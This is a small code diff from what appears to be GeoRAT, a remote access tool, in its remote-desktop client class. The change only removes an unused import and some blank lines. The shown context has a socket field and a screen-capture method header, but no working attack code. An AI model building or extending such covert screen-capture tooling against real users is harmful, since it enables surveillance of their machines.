@@ -9,17 +9,12 @@ using System.Net;
 using System.Net.Sockets;
 using System.Threading;
 using System.Windows.Forms;
-using StreamLibrary.UnsafeCodecs;
-
+ 
 namespace GeoRAT.Client.Network.RemoteDesktop
 {
     class DesktopSharing
     {
         private Socket senderSocket;
-
-      
-
-
        
         private static Bitmap CaptureScreen()
         {
